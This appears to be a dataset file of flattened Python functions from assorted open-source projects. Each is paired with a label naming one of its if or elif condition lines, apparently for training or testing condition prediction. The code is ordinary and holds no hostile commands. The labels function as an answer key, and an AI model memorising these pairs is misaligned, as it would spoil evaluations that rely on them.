{"input": "def findUserByAttr(self, identifier, attr_type, attr_data): for uid in self.users_info: attrs = self.users_info[uid] for attr in attrs: if attr_type == attr[\"attr_type\"] and attr_data == attr[\"attr_data\"]: return defer.succeed(uid) uid = self.nextId() self.db.insertTestData([User(uid=uid, identifier=identifier)]) self.db.insertTestData( [UserInfo(uid=uid, attr_type=attr_type, attr_data=attr_data)] ) return defer.succeed(uid)", "label": "if attr_type == attr [ \"attr_type\" ] and attr_data == attr [ \"attr_data\" ] :"}
{"input": "def order_note_added_event(*, order: Order, user: UserType, message: str) -> OrderEvent: kwargs = {} if user is not None and not user.is_anonymous: if order.user is not None and order.user.pk == user.pk: account_events.customer_added_to_note_order_event( user=user, order=order, message=message ) kwargs[\"user\"] = user return OrderEvent.objects.create( order=order, type=OrderEvents.NOTE_ADDED, parameters={\"message\": message}, **kwargs, )", "label": "if order . user is not None and order . user . pk == user . pk :"}
{"input": "def __str__(self): if self.team: if self.down != 0: return \"(%s, %s, Q%d, %d and %d) %s\" % ( self.team, self.data[\"yrdln\"], self.time.qtr, self.down, self.yards_togo, self.desc, ) else: return \"(%s, %s, Q%d) %s\" % ( self.team, self.data[\"yrdln\"], self.time.qtr, self.desc, ) return self.desc", "label": "if self . down != 0 :"}
{"input": "def write(self, stream): self.write1(stream) i = 0 n = 0 for name, offset, value, bsize in self.variables: stream.write(self.body[i:offset]) if bsize == 4: write_uint(stream, value) elif bsize == 8: write_ulong(stream, value) else: raise NotImplementedError() n += offset - i + bsize i = offset + bsize stream.write(self.body[i:]) n += len(self.body) - i assert n == len(self.body)", "label": "if bsize == 4 :"}
{"input": "def __setattr__(self, attr, val): if hasattr(self, attr): old = getattr(self, attr) if isinstance(old, Setting): if isinstance(val, Setting): raise ValueError( \"Attempting to reassign setting %s with %s\" % (old, val) ) log.warn(\"Setting attr %s via __setattr__ instead of set()!\", attr) return old.set(val) log.debug(\"Setting {%s => %s}\" % (attr, val)) return object.__setattr__(self, attr, val)", "label": "if isinstance ( old , Setting ) :"}
{"input": "def setup_release_cwd_hook(prompter, history, completer, bindings, **kw): if ON_WINDOWS and not ON_CYGWIN and not ON_MSYS: prompter.prompt = _cwd_release_wrapper(prompter.prompt) if completer.completer: # Temporarily restore cwd for callbacks to the completer completer.completer.complete = _cwd_restore_wrapper( completer.completer.complete )", "label": "if completer . completer :"}
{"input": "def nested_update(org_dict, upd_dict): for key, value in upd_dict.items(): if isinstance(value, dict): if key in org_dict: if not isinstance(org_dict[key], dict): raise ValueError( \"Mismatch between org_dict and upd_dict at node {}\".format(key) ) nested_update(org_dict[key], value) else: org_dict[key] = value else: org_dict[key] = value", "label": "if isinstance ( value , dict ) :"}
{"input": "def get_field_by_name(obj, field): # Dereference once if obj.type.code == gdb.TYPE_CODE_PTR: obj = obj.dereference() for f in re.split(\"(->|\\.|\\[\\d+\\])\", field): if not f: continue if f == \"->\": obj = obj.dereference() elif f == \".\": pass elif f.startswith(\"[\"): n = int(f.strip(\"[]\")) obj = obj.cast(obj.dereference().type.pointer()) obj += n obj = obj.dereference() else: obj = obj[f] return obj", "label": "elif f . startswith ( \"[\" ) :"}
{"input": "def check_sum(self, x, gpu=False): total = 0 for i in range(5): t = numpy.array([i], dtype=numpy.int32) if gpu: t = cuda.to_gpu(t) loss = self.link(chainer.Variable(x), chainer.Variable(t)).data self.assertEqual(loss.dtype, self.dtype) self.assertEqual(loss.shape, ()) total += numpy.exp(-cuda.to_cpu(loss)) self.assertAlmostEqual(1.0, float(total), **self.check_sum_options)", "label": "if gpu :"}
{"input": "def find_node_by_link(node_group, to_node, inp): for link in node_group.links: if link.to_node == to_node and link.to_socket == inp: if link.from_node.bl_idname == \"NodeReroute\": # Step through reroutes return find_node_by_link( node_group, link.from_node, link.from_node.inputs[0] ) return link.from_node", "label": "if link . from_node . bl_idname == \"NodeReroute\" :"}
{"input": "def _gen_opnds(ii): # generator # filter out write-mask operands and suppressed operands for op in ii.parsed_operands: if op.lookupfn_name in [\"MASK1\", \"MASKNOT0\"]: continue if op.visibility == \"SUPPRESSED\": continue if op.name == \"BCAST\": continue yield op", "label": "if op . lookupfn_name in [ \"MASK1\" , \"MASKNOT0\" ] :"}
{"input": "def contains_trained_model(self): if not hasattr(self, \"_contains_trained_model\"): for f in self._files: if \".pt\" in f: self._contains_trained_model = True self._model_name = f return self._contains_trained_model self._contains_trained_model = False return self._contains_trained_model else: return self._contains_trained_model", "label": "if \".pt\" in f :"}
{"input": "def _call(self, name, *args, **kwargs): data = self._get_data(name, *args, **kwargs) is_ascii = self._encoding == \"ascii\" body = json.dumps(data, ensure_ascii=is_ascii).encode(self._encoding) resp = await self._http.post(self._url, data=body) if self._full_response: return resp else: content = resp.json() if resp.is_error: if \"error\" not in content: resp.raise_for_status() return self.loads(content)", "label": "if \"error\" not in content :"}
{"input": "def get_classif_name(classifier_config, usepytorch): if not usepytorch: modelname = \"sklearn-LogReg\" else: nhid = classifier_config[\"nhid\"] optim = ( \"adam\" if \"optim\" not in classifier_config else classifier_config[\"optim\"] ) bs = ( 64 if \"batch_size\" not in classifier_config else classifier_config[\"batch_size\"] ) modelname = \"pytorch-MLP-nhid%s-%s-bs%s\" % (nhid, optim, bs) return modelname", "label": "if \"batch_size\" not in classifier_config"}
{"input": "def on_fill(self, order: Order, exchange: \"Exchange\", trade: \"Trade\"): if trade.order_id in self._executed and trade not in self._trades: self._trades[trade.order_id] = self._trades.get(trade.order_id, []) self._trades[trade.order_id] += [trade] if order.is_complete(): next_order = order.complete(exchange) if next_order: self.submit(next_order)", "label": "if next_order :"}
{"input": "def _create_examples(cls, lines, set_type): examples = [] for (i, line) in enumerate(lines): # Skip the header (first line) if i == 0: continue segments = line.strip().split(\"\\t\") idx, text_a, text_b, label = segments examples.append( Example( guid=\"%s-%s\" % (set_type, idx), text_a=text_a, text_b=text_b, label=label, ) ) return examples", "label": "if i == 0 :"}
{"input": "def split_path_info(path): # suitable for splitting an already-unquoted-already-decoded (unicode) # path value path = path.strip(\"/\") clean = [] for segment in path.split(\"/\"): if not segment or segment == \".\": continue elif segment == \"..\": if clean: del clean[-1] else: clean.append(segment) return tuple(clean)", "label": "if clean :"}
{"input": "def _mock_manager(self, *args, **kwargs): if kwargs and \"normalize\" not in kwargs: device_params = kwargs[\"device_params\"] device_handler = make_device_handler(device_params) session = SSHSession(device_handler) return Manager(session, device_handler) if args: if args[0].tag == \"request-pfe-execute\": file_name = (args[0].findtext(\"command\")).replace(\" \", \"_\") return self._read_file(file_name + \".xml\") elif args[0].tag == \"command\": file_name = (args[0].text).replace(\" \", \"_\") return self._read_file(file_name + \".xml\")", "label": "if args [ 0 ] . tag == \"request-pfe-execute\" :"}
{"input": "def update_loan_status(self, cancel=0): if cancel: loan_status = frappe.get_value(\"Loan\", self.loan, \"status\") if loan_status == \"Closed\": frappe.db.set_value(\"Loan\", self.loan, \"status\", \"Loan Closure Requested\") else: pledged_qty = 0 current_pledges = get_pledged_security_qty(self.loan) for security, qty in iteritems(current_pledges): pledged_qty += qty if not pledged_qty: frappe.db.set_value(\"Loan\", self.loan, \"status\", \"Closed\")", "label": "if loan_status == \"Closed\" :"}
{"input": "def _wrapped_view(request, *args, **kwargs): if flag_name.startswith(\"!\"): active = not flag_is_active(request, flag_name[1:]) else: active = flag_is_active(request, flag_name) if not active: response_to_redirect_to = get_response_to_redirect(redirect_to, *args, **kwargs) if response_to_redirect_to: return response_to_redirect_to else: raise Http404 return view(request, *args, **kwargs)", "label": "if response_to_redirect_to :"}
{"input": "def process_stroke_filter(stroke, min_distance=1.0, max_distance=2.0): \"\"\"filter stroke to pts that are at least min_distance apart\"\"\" nstroke = stroke[:1] for p in stroke[1:]: v = p - nstroke[-1] l = v.length if l < min_distance: continue d = v / l while l > 0: q = nstroke[-1] + d * min(l, max_distance) nstroke.append(q) l -= max_distance return nstroke", "label": "if l < min_distance :"}
{"input": "def _fix_break_node(self, node: Node): end_node = self._find_end_loop(node, [], 0) if not end_node: # If there is not end condition on the loop # The exploration will reach a STARTLOOP before reaching the endloop # We start with -1 as counter to catch this corner case end_node = self._find_end_loop(node, [], -1) if not end_node: raise ParsingError(\"Break in no-loop context {}\".format(node.function)) for son in node.sons: son.remove_father(node) node.set_sons([end_node]) end_node.add_father(node)", "label": "if not end_node :"}
{"input": "def _Append(cls, session, word, mail_ids, compact=True): super(GlobalPostingList, cls)._Append(session, word, mail_ids, compact=compact) with GLOBAL_GPL_LOCK: global GLOBAL_GPL sig = cls.WordSig(word, session.config) if GLOBAL_GPL is None: GLOBAL_GPL = {} if sig not in GLOBAL_GPL: GLOBAL_GPL[sig] = set() for mail_id in mail_ids: GLOBAL_GPL[sig].add(mail_id)", "label": "if GLOBAL_GPL is None :"}
{"input": "def __saveComment(self): \"\"\"Saves the new or selected comment\"\"\" if self.__btnSave.text() == SAVE_NEW: # If saving a new comment self.__addComment(self.__textSubject.text(), self.__textMessage.toPlainText()) self.refreshComments() else: # If saving a modified comment if self.__treeSubjects.currentItem(): comment = self.__treeSubjects.currentItem().getInstance() comment.setSubject(str(self.__textSubject.text())) comment.setMessage(str(self.__textMessage.toPlainText())) self.__treeSubjects.currentItem().getInstance().save() self.refreshComments()", "label": "if self . __treeSubjects . currentItem ( ) :"}
{"input": "def verify_random_objects(): resources = [Node, Registration, QuickFilesNode] for resource in resources: for i in range(1, 10): random_resource = _get_random_object(resource) if random_resource: _verify_contributor_perms(random_resource)", "label": "if random_resource :"}
{"input": "def apply_gradient_modifiers(self): for layer_name, views in self.gradient_modifiers.items(): for view_name, gradient_mods in views.items(): for gm in gradient_mods: gm.rnd.set_seed(self.rnd.generate_seed()) if isinstance(gm, GradientModifier): gm( self.handler, self.buffer[layer_name].parameters[view_name], self.buffer[layer_name].gradients[view_name], ) else: gm(self.handler, self.buffer[layer_name].gradients[view_name])", "label": "if isinstance ( gm , GradientModifier ) :"}
{"input": "def _split_auth_string(auth_string): \"\"\"split a digest auth string into individual key=value strings\"\"\" prev = None for item in auth_string.split(\",\"): try: if prev.count('\"') == 1: prev = \"%s,%s\" % (prev, item) continue except AttributeError: if prev == None: prev = item continue else: raise StopIteration yield prev.strip() prev = item yield prev.strip() raise StopIteration", "label": "if prev . count ( '\"' ) == 1 :"}
{"input": "def checkUnchangedIvars(obj, d, exceptions=None): if not exceptions: exceptions = [] ok = True for key in d: if key not in exceptions: if getattr(obj, key) != d.get(key): g.trace( \"changed ivar: %s old: %s new: %s\" % (key, repr(d.get(key)), repr(getattr(obj, key))) ) ok = False return ok", "label": "if key not in exceptions :"}
{"input": "def checkChildren(item): for c in item.children(): _id = c.data(Outline.ID.value) if not _id or _id == \"0\": c.getUniqueID() checkChildren(c)", "label": "if not _id or _id == \"0\" :"}
{"input": "def main(): if len(sys.argv) > 1: g = globals().copy() r = g[\"test_\" + sys.argv[1]]() if r is not None: for func_and_args in r: func, args = func_and_args[0], func_and_args[1:] func(*args) else: run_all()", "label": "if r is not None :"}
{"input": "def _create_entities( parsed_entities: Dict[Text, Union[Text, List[Text]]], sidx: int, eidx: int ) -> List[Dict[Text, Any]]: entities = [] for k, vs in parsed_entities.items(): if not isinstance(vs, list): vs = [vs] for value in vs: entities.append( { \"entity\": k, \"start\": sidx, \"end\": eidx, # can't be more specific \"value\": value, } ) return entities", "label": "if not isinstance ( vs , list ) :"}
{"input": "def _group_stacks(stacks: Stacks) -> List[dict]: stacks_by_client: dict = {} for stack in stacks: client = stack.client if client not in stacks_by_client: stacks_by_client[client] = {\"Client\": client, \"Stacks\": []} stacks_by_client[client][\"Stacks\"].append(stack) return [stacks_by_client[r] for r in stacks_by_client]", "label": "if client not in stacks_by_client :"}
{"input": "def append(self, labels): if isinstance(labels, list): for label in labels: if not label in self.__menuLabels: self.__menuLabels.append(label) self.__enabledLabels.append(label) else: if not labels in self.__menuLabels: self.__menuLabels.append(labels) self.__enabledLabels.append(labels)", "label": "if not labels in self . __menuLabels :"}
{"input": "def _json_to_flat_metrics(self, prefix, data): for key, value in data.items(): if isinstance(value, dict): for k, v in self._json_to_flat_metrics(\"%s.%s\" % (prefix, key), value): yield k, v else: try: int(value) except ValueError: value = None finally: yield (\"%s.%s\" % (prefix, key), value)", "label": "if isinstance ( value , dict ) :"}
{"input": "def _rename(src, dst): src = to_unicode(src, sys.getfilesystemencoding()) dst = to_unicode(dst, sys.getfilesystemencoding()) if _rename_atomic(src, dst): return True retry = 0 rv = False while not rv and retry < 100: rv = _MoveFileEx(src, dst, _MOVEFILE_REPLACE_EXISTING | _MOVEFILE_WRITE_THROUGH) if not rv: time.sleep(0.001) retry += 1 return rv", "label": "if not rv :"}
{"input": "def expect_stream_start(self): if isinstance(self.event, StreamStartEvent): if self.event.encoding and not getattr(self.stream, \"encoding\", None): self.encoding = self.event.encoding self.write_stream_start() self.state = self.expect_first_document_start else: raise EmitterError(\"expected StreamStartEvent, but got %s\" % self.event)", "label": "if self . event . encoding and not getattr ( self . stream , \"encoding\" , None ) :"}
{"input": "def _doWait(self): doit = True while doit: # A wrapper method for wait() and the wait thread to use self.setMeta(\"SignalInfo\", None) self.setMeta(\"PendingSignal\", None) event = self.platformWait() self.running = False self.platformProcessEvent(event) doit = self.shouldRunAgain() if doit: self._doRun()", "label": "if doit :"}
{"input": "def get_source(self, environment, template): if self._sep in template: prefix, name = template.split(self._sep, 1) if prefix not in self._mapping: raise TemplateNotFound(template) return self._mapping[prefix].get_source(environment, name) return self._default.get_source(environment, template)", "label": "if prefix not in self . _mapping :"}
{"input": "def find_child_processes_that_send_spans(pants_result_stderr): child_processes = set() for line in pants_result_stderr.split(\"\\n\"): if \"Sending spans to Zipkin server from pid:\" in line: i = line.rindex(\":\") child_process_pid = line[i + 1 :] child_processes.add(int(child_process_pid)) return child_processes", "label": "if \"Sending spans to Zipkin server from pid:\" in line :"}
{"input": "def list_dependencies_modules(self, *modules): \"\"\"[UNIT]... show the dependency tree\" \"\"\" found_all = True units = [] for module in modules: matched = self.match_units([module]) if not matched: logg.error(\"no such service '%s'\", module) found_all = False continue for unit in matched: if unit not in units: units += [unit] return self.list_dependencies_units(units) # and found_all", "label": "if unit not in units :"}
{"input": "def getCommitFromFile(short=True): global _gitdir branch = getBranchFromFile() commit = None if _gitdir and branch: if branch == \"HEAD\": commitFile = os.path.join(_gitdir, \"HEAD\") else: commitFile = os.path.join(_gitdir, \"refs\", \"heads\", branch) if os.path.isfile(commitFile): with open(commitFile, \"r\", encoding=\"utf-8\") as f: commit = f.readline().strip() if short and commit: return commit[:8] else: return commit", "label": "if branch == \"HEAD\" :"}
{"input": "def _node_for(pvector_like, i): if 0 <= i < pvector_like._count: if i >= pvector_like._tail_offset: return pvector_like._tail node = pvector_like._root for level in range(pvector_like._shift, 0, -SHIFT): node = node[(i >> level) & BIT_MASK] # >>> return node raise IndexError(\"Index out of range: %s\" % (i,))", "label": "if i >= pvector_like . _tail_offset :"}
{"input": "def check(self): global MySQLdb import MySQLdb try: args = {} if mysql_user: args[\"user\"] = mysql_user if mysql_pwd: args[\"passwd\"] = mysql_pwd if mysql_host: args[\"host\"] = mysql_host if mysql_port: args[\"port\"] = mysql_port if mysql_socket: args[\"unix_socket\"] = mysql_socket self.db = MySQLdb.connect(**args) except Exception as e: raise Exception(\"Cannot interface with MySQL server: %s\" % e)", "label": "if mysql_host :"}
{"input": "def flatten(self, d, parent_key=\"\", sep=\".\"): items = [] for k, v in d.items(): new_key = parent_key + sep + k if parent_key else k if isinstance(v, MutableMapping): items.extend(self.flatten(v, new_key, sep=sep).items()) else: items.append((new_key, v)) return dict(items)", "label": "if isinstance ( v , MutableMapping ) :"}
{"input": "def get_item(type_, preference): items = {} for item in playlist.findall(\"./info/%s/item\" % type_): lang, label = xpath_text(item, \"lg\", default=None), xpath_text( item, \"label\", default=None ) if lang and label: items[lang] = label.strip() for p in preference: if items.get(p): return items[p]", "label": "if lang and label :"}
{"input": "def test_lxml(): try: from lxml.etree import LXML_VERSION, __version__ if LXML_VERSION >= (2, 1, 4, 0): return True, __version__ else: return False, __version__ except ImportError: return None, None", "label": "if LXML_VERSION >= ( 2 , 1 , 4 , 0 ) :"}
{"input": "def send(self, data, flags=0, timeout=timeout_default): if timeout is timeout_default: timeout = self.timeout try: return self._sock.send(data, flags) except error as ex: if ex.args[0] not in _socketcommon.GSENDAGAIN or timeout == 0.0: raise sys.exc_clear() self._wait(self._write_event) try: return self._sock.send(data, flags) except error as ex2: if ex2.args[0] == EWOULDBLOCK: return 0 raise", "label": "if ex . args [ 0 ] not in _socketcommon . GSENDAGAIN or timeout == 0.0 :"}
{"input": "def blob_from_lang(self): self.acquire_lock() try: if self._blob_from_lang_cache is None: try: self._load_buf_data_once() except NotFoundInDatabase: self.release_lock() try: self.scan() finally: self.acquire_lock() self._load_buf_data_once(True) return self._blob_from_lang_cache finally: self.release_lock()", "label": "if self . _blob_from_lang_cache is None :"}
{"input": "def processElem(elem, keyList): for k, v in elem.items(): prefix = \".\".join(keyList) if k not in self.IGNORE_ELEMENTS and self.NUMVAL_MATCH.match(v): k = makeSane(k) self.publish(\"%s.%s\" % (prefix, k), v)", "label": "if k not in self . IGNORE_ELEMENTS and self . NUMVAL_MATCH . match ( v ) :"}
{"input": "def __conform__(self, interface, registry=None, default=None): for providedInterface in self.provided: if providedInterface.isOrExtends(interface): return self.load() if getAdapterFactory(providedInterface, interface, None) is not None: return interface(self.load(), default) return default", "label": "if getAdapterFactory ( providedInterface , interface , None ) is not None :"}
{"input": "def restrict(points): result = [] for p in points: if point_inside_mesh(bvh, p): result.append(p) else: loc, normal, index, distance = bvh.find_nearest(p) if loc is not None: result.append(tuple(loc)) return result", "label": "if point_inside_mesh ( bvh , p ) :"}
{"input": "def __iter__(self): buffer = [b\"\"] for chunk in self.stream(decode_content=True): if b\"\\n\" in chunk: chunk = chunk.split(b\"\\n\") yield b\"\".join(buffer) + chunk[0] + b\"\\n\" for x in chunk[1:-1]: yield x + b\"\\n\" if chunk[-1]: buffer = [chunk[-1]] else: buffer = [] else: buffer.append(chunk) if buffer: yield b\"\".join(buffer)", "label": "if chunk [ - 1 ] :"}
{"input": "def clear_doc(self, docname: str) -> None: for sChild in self._children: sChild.clear_doc(docname) if sChild.declaration and sChild.docname == docname: sChild.declaration = None sChild.docname = None sChild.line = None if sChild.siblingAbove is not None: sChild.siblingAbove.siblingBelow = sChild.siblingBelow if sChild.siblingBelow is not None: sChild.siblingBelow.siblingAbove = sChild.siblingAbove sChild.siblingAbove = None sChild.siblingBelow = None", "label": "if sChild . siblingBelow is not None :"}
{"input": "def _get_current_weight(self, policy, fw): weights = policy.get_weights() if fw == \"torch\": # DQN model. if \"_hidden_layers.0._model.0.weight\" in weights: return weights[\"_hidden_layers.0._model.0.weight\"][0][0] # DDPG model. else: return weights[\"policy_model.action_0._model.0.weight\"][0][0] key = 0 if fw in [\"tf2\", \"tfe\"] else list(weights.keys())[0] return weights[key][0][0]", "label": "if \"_hidden_layers.0._model.0.weight\" in weights :"}
{"input": "def add_unit(self, name, value, aliases=tuple(), **modifiers): \"\"\"Add unit to the registry.\"\"\" if not isinstance(value, self.Quantity): value = self.Quantity(value, **modifiers) self._UNITS[name] = value for ndx, alias in enumerate(aliases): if \" \" in alias: logger.warn(\"Alias cannot contain a space \" + alias) self._UNITS.add_alias(alias.strip(), name, not ndx)", "label": "if \" \" in alias :"}
{"input": "def keyPressEvent(self, event): \"\"\"Add up and down arrow key events to built in functionality.\"\"\" keyPressed = event.key() if keyPressed in [Constants.UP_KEY, Constants.DOWN_KEY, Constants.TAB_KEY]: if keyPressed == Constants.UP_KEY: self.index = max(0, self.index - 1) elif keyPressed == Constants.DOWN_KEY: self.index = min(len(self.completerStrings) - 1, self.index + 1) elif keyPressed == Constants.TAB_KEY and self.completerStrings: self.tabPressed() if self.completerStrings: self.setTextToCompleterIndex() super(CueLineEdit, self).keyPressEvent(event)", "label": "elif keyPressed == Constants . TAB_KEY and self . completerStrings :"}
{"input": "def _add_bookmark_breakpoint(self): \"\"\"Add a bookmark or breakpoint to the current file in the editor.\"\"\" editorWidget = self.ide.mainContainer.get_actual_editor() if editorWidget and editorWidget.hasFocus(): if self.ide.mainContainer.actualTab.navigator.operation == 1: editorWidget._sidebarWidget.set_bookmark( editorWidget.textCursor().blockNumber() ) elif self.ide.mainContainer.actualTab.navigator.operation == 2: editorWidget._sidebarWidget.set_breakpoint( editorWidget.textCursor().blockNumber() )", "label": "if self . ide . mainContainer . actualTab . navigator . operation == 1 :"}
{"input": "def list_generator(pages, num_results): result = [] # get first page items page = list(next(pages)) result += page while True: if not pages.continuation_token: break # handle num results if num_results is not None: if num_results == len(result): break page = list(next(pages)) result += page return result", "label": "if num_results == len ( result ) :"}
{"input": "def _print_handles(self, text, handle_list): for handle in handle_list: source, citation = self.get_source_or_citation(handle, False) _LOG.debug(\"\\n\\n\\n\") if source: _LOG.debug(\"---- %s -- source %s\" % (text, source.get_title())) elif citation: _LOG.debug(\"---- %s -- citation %s\" % (text, citation.get_page())) else: _LOG.debug(\"---- %s -- handle %s\" % (text, handle))", "label": "elif citation :"}
{"input": "def _parse_whois(self, txt): asn, desc = None, b\"\" for l in txt.splitlines(): if not asn and l.startswith(b\"origin:\"): asn = l[7:].strip().decode(\"utf-8\") if l.startswith(b\"descr:\"): if desc: desc += br\"\\n\" desc += l[6:].strip() if asn is not None and desc.strip(): desc = desc.strip().decode(\"utf-8\") break return asn, desc", "label": "if desc :"}
{"input": "def build(opt): dpath = os.path.join(opt[\"datapath\"], \"multiwoz_v20\") version = \"1.0\" if not build_data.built(dpath, version_string=version): print(\"[building data: \" + dpath + \"]\") if build_data.built(dpath): build_data.remove_dir(dpath) build_data.make_dir(dpath) # Download the data. for downloadable_file in RESOURCES: downloadable_file.download_file(dpath) build_data.mark_done(dpath, version_string=version)", "label": "if build_data . built ( dpath ) :"}
{"input": "def _global_pool2d_shape_func(data_shape, height_axis, width_axis): out = output_tensor((data_shape.shape[0],), \"int64\") for i in const_range(out.shape[0]): if i == height_axis or i == width_axis: out[i] = int64(1) else: out[i] = data_shape[i] return out", "label": "if i == height_axis or i == width_axis :"}
{"input": "def post_mortem(t=None): # handling the default if t is None: # sys.exc_info() returns (type, value, traceback) if an exception is # being handled, otherwise it returns None t = sys.exc_info()[2] if t is None: raise ValueError( \"A valid traceback must be passed if no \" \"exception is being handled\" ) p = Pdb() p.reset() p.interaction(None, t)", "label": "if t is None :"}
{"input": "def clear(self, purge=False, delete_dataset=True): self.deleted = True if self.dataset: if delete_dataset: self.dataset.deleted = True if purge: self.dataset.purged = True if purge and self.dataset.deleted: # do something with purging self.purged = True try: os.unlink(self.file_name) except Exception as e: log.error( \"Failed to purge associated file ({}) from disk: {}\".format( self.file_name, unicodify(e) ) )", "label": "if delete_dataset :"}
{"input": "def scan_resource_conf(self, conf): if \"properties\" in conf: if \"supportsHttpsTrafficOnly\" in conf[\"properties\"]: if str(conf[\"properties\"][\"supportsHttpsTrafficOnly\"]).lower() == \"true\": return CheckResult.PASSED else: return CheckResult.FAILED # Use default if supportsHttpsTrafficOnly is not set if \"apiVersion\" in conf: # Default for apiVersion 2019 and newer is supportsHttpsTrafficOnly = True year = int(conf[\"apiVersion\"][0:4]) if year < 2019: return CheckResult.FAILED else: return CheckResult.PASSED return CheckResult.FAILED", "label": "if \"supportsHttpsTrafficOnly\" in conf [ \"properties\" ] :"}
{"input": "def connect(self): while True: errno = self.sock.connect_ex(self.addr) if not errno: # connected immediately. break elif errno == EINPROGRESS: # will be connected. break elif errno == ENOENT: # no such socket file. self.create_connection(self.failover_interval) return else: raise ValueError(\"Unexpected socket errno: %d\" % errno) self.event_loop.watch_file(self.sock.fileno(), self.handle)", "label": "elif errno == ENOENT :"}
{"input": "def _get_commands(): proc = Popen([\"react-native\", \"--help\"], stdout=PIPE) should_yield = False for line in proc.stdout.readlines(): line = line.decode().strip() if not line: continue if \"Commands:\" in line: should_yield = True continue if should_yield: yield line.split(\" \")[0]", "label": "if should_yield :"}
{"input": "def getintdict(self, section): try: # Exclude keys from [DEFAULT] section because in general they do not hold int values return dict( (key, int(value)) for key, value in self.items(section) if key not in {k for k, _ in self.items(\"DEFAULT\")} ) except NoSectionError: return {}", "label": "if key not in { k for k , _ in self . items ( \"DEFAULT\" ) }"}
{"input": "def _gen_opnds(ii): # generator # filter out write-mask operands and suppressed operands for op in ii.parsed_operands: if op.lookupfn_name in [\"MASK1\", \"MASKNOT0\"]: continue if op.visibility == \"SUPPRESSED\": continue if op.name == \"BCAST\": continue yield op", "label": "if op . visibility == \"SUPPRESSED\" :"}
{"input": "def do_definition(tag): w.end_para() macro(\".TP\") w.started = True split = 0 pre = [] post = [] for typ, text in _bitlist(tag): if split: post.append((typ, text)) elif text.lstrip().startswith(\": \"): split = 1 post.append((typ, text.lstrip()[2:].lstrip())) else: pre.append((typ, text)) _boldline(pre) w.write(_text(post)) w.started = False", "label": "elif text . lstrip ( ) . startswith ( \": \" ) :"}
{"input": "def EvalInScriptedSection(self, codeBlock, globals, locals=None): if locals is None: locals = globals assert not codeBlock.beenExecuted, \"This code block should not have been executed\" codeBlock.beenExecuted = 1 self.BeginScriptedSection() try: try: return self._EvalInScriptedSection(codeBlock.codeObject, globals, locals) finally: if self.debugManager: self.debugManager.OnLeaveScript() self.EndScriptedSection() except: self.HandleException(codeBlock)", "label": "if self . debugManager :"}
{"input": "def OSError__str__(self): if self.filename: if self.filename2: return \"[Errno %s] %s: %s -> %s\" % ( self.errno, self.strerror, self.filename, self.filename2, ) else: return \"[Errno %s] %s: %s\" % (self.errno, self.strerror, self.filename) if self.errno and self.strerror: return \"[Errno %s] %s\" % (self.errno, self.strerror) return BaseException.__str__(self)", "label": "if self . filename2 :"}
{"input": "def save(self, *args, **kwargs): if not self.identifier: charset = list(\"ABCDEFGHJKLMNPQRSTUVWXYZ3789\") while True: code = get_random_string(length=8, allowed_chars=charset) if not Question.objects.filter(event=self.event, identifier=code).exists(): self.identifier = code break super().save(*args, **kwargs) if self.event: self.event.cache.clear()", "label": "if not Question . objects . filter ( event = self . event , identifier = code ) . exists ( ) :"}
{"input": "def malloc(self, size): # return a block of right size (possibly rounded up) assert 0 <= size < sys.maxint if os.getpid() != self._lastpid: self.__init__() # reinitialize after fork self._lock.acquire() try: size = self._roundup(max(size, 1), self._alignment) (arena, start, stop) = self._malloc(size) new_stop = start + size if new_stop < stop: self._free((arena, new_stop, stop)) block = (arena, start, new_stop) self._allocated_blocks.add(block) return block finally: self._lock.release()", "label": "if new_stop < stop :"}
{"input": "def commit(cache): assert cache.is_alive try: if cache.modified: cache.flush() if cache.in_transaction: assert cache.connection is not None cache.database.provider.commit(cache.connection, cache) cache.for_update.clear() cache.query_results.clear() cache.max_id_cache.clear() cache.immediate = True except: cache.rollback() raise", "label": "if cache . in_transaction :"}
{"input": "def __get_tasks(cls, task_ids=None, project_name=None, task_name=None, **kwargs): if task_ids: if isinstance(task_ids, six.string_types): task_ids = [task_ids] return [ cls(private=cls.__create_protection, task_id=task_id, log_to_backend=False) for task_id in task_ids ] return [ cls(private=cls.__create_protection, task_id=task.id, log_to_backend=False) for task in cls._query_tasks( project_name=project_name, task_name=task_name, **kwargs ) ]", "label": "if isinstance ( task_ids , six . string_types ) :"}
{"input": "def _VarRefOrWord(node, dynamic_arith): # type: (arith_expr_t, bool) -> bool with tagswitch(node) as case: if case(arith_expr_e.VarRef): return True elif case(arith_expr_e.Word): if dynamic_arith: return True return False", "label": "if case ( arith_expr_e . VarRef ) :"}
{"input": "def fit(self, data_instances, suffix): if self.statics_obj is None: self.statics_obj = MultivariateStatisticalSummary(data_instances) quantile_points = self.statics_obj.get_quantile_point(self.percentile) for col_name in self.selection_properties.select_col_names: quantile_value = quantile_points.get(col_name) if quantile_value < self.upper_threshold: self.selection_properties.add_left_col_name(col_name) self.selection_properties.add_feature_value(col_name, quantile_value) self._keep_one_feature(pick_high=True) return self", "label": "if quantile_value < self . upper_threshold :"}
{"input": "def predict_dict(self, words): \"\"\"Predict a list of expansions given words.\"\"\" expansions = [] for w in words: if w in self.expansion_dict: expansions += [self.expansion_dict[w]] elif w.lower() in self.expansion_dict: expansions += [self.expansion_dict[w.lower()]] else: expansions += [w] return expansions", "label": "elif w . lower ( ) in self . expansion_dict :"}
{"input": "def connect(self, host, port, ssl, helo, starttls, timeout): if ssl == \"0\": if not port: port = 25 fp = SMTP(timeout=int(timeout)) else: if not port: port = 465 fp = SMTP_SSL(timeout=int(timeout)) resp = fp.connect(host, int(port)) if helo: cmd, name = helo.split(\" \", 1) if cmd.lower() == \"ehlo\": resp = fp.ehlo(name) else: resp = fp.helo(name) if not starttls == \"0\": resp = fp.starttls() return TCP_Connection(fp, resp)", "label": "if not port :"}
{"input": "def _init_from_text(self, text): parts = text.split(\"; \") for part in parts: key, val = part.split(\"=\") if key == \"CLONE\": if val[:5] == \"IMAGE\": self.is_image = True self.image = val[6:] setattr(self, key.lower(), val)", "label": "if val [ : 5 ] == \"IMAGE\" :"}
{"input": "def to_laid_out_tensor(self): if not self._reduced: self._reduced = self.mesh_impl.allreduce( self.laid_out_input, self.mesh_axes, \"SUM\" ) if self._add_counter_fn: self._add_counter_fn() return self._reduced", "label": "if self . _add_counter_fn :"}
{"input": "def platformGetThreads(self): ret = {} self._sendPkt(\"qfThreadInfo\") tbytes = self._recvPkt() while tbytes.startswith(\"m\"): if tbytes.find(\",\"): for bval in tbytes[1:].split(\",\"): ret[int(bval, 16)] = 0 else: ret[int(tbytes[1:], 16)] = 0 self._sendPkt(\"qsThreadInfo\") tbytes = self._recvPkt() return ret", "label": "if tbytes . find ( \",\" ) :"}
